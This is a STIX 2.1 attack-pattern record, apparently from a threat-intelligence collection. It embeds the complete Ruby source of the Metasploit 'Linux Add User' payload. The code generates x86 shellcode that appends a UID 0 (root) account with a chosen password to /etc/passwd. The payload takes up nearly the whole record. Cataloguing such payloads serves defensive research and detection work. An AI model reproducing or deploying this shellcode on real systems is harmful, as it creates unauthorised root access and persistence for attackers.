{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26accd8d-b02a-41f4-98f1-99ce11bf31fb",
    "created": "2024-08-14T16:33:19.429921Z",
    "modified": "2024-08-14T16:33:19.429925Z",
    "name": "Linux Add User",
    "description": "Create a new user with UID 0",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/adduser.rb",
            "external_id": "adduser.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# AddUser\n# -------\n#\n# Adds a UID 0 user to /etc/passwd.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 97\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Add User',\n      'Description'   => 'Create a new user with UID 0',\n      'Author'        => [ 'skape', 'vlad902', 'spoonm' ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86,\n      'Privileged'    => true))\n\n    # Register adduser options\n    register_options(\n      [\n        OptString.new('USER',  [ true,  \"The username to create\",     \"metasploit\" ]),\n        OptString.new('PASS',  [ true,  \"The password for this user\", \"metasploit\" ]),\n        OptString.new('SHELL', [ false, \"The shell for this user\",    \"/bin/sh\"    ]),\n      ])\n  end\n\n  #\n  # Dynamically builds the adduser payload based on the user's options.\n  #\n  def generate(opts={})\n    user    = datastore['USER']  || 'metasploit'\n    pass    = datastore['PASS']  || 'metasploit'\n    shell   = datastore['SHELL'] || '/bin/sh'\n    str     = \"#{user}:#{pass.crypt('Az')}:0:0::/:#{shell}\\n\"\n    payload =\n      \"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\" +\n      \"\\x31\\xc9\\x51\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\" +\n      \"\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x41\\xb5\\x04\\xcd\" +\n      \"\\x80\\x93\" + Rex::Arch::X86.call(str.length) + str +\n      \"\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\" +\n      \"\\xcd\\x80\"\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}